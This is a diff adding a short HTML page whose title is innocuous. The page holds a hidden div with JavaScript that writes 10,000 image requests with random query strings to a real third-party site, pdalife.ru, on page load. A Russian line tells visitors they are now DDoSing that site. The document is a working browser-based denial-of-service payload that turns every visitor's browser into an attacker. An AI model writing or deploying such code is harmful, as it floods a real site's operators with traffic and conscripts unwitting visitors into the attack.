@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Some page with 2 style</title>
+</head>
+<body>
+	<div id="attack" style="visibility:hidden">
+<script type="text/javascript">
+attack_host="pdalife.ru"
+attack_port=80
+path='/'
+for(i=1;i<=10000;i++)
+{ document.write('<img src="http://'+ attack_host + ':' + attack_port + '/' + path + '?' + Math.random() +'">');}
+</script></div>
+	<p>Прости, но ты сейчас DDoS-иш pdalife.ru</p>
+</body>
+</html>
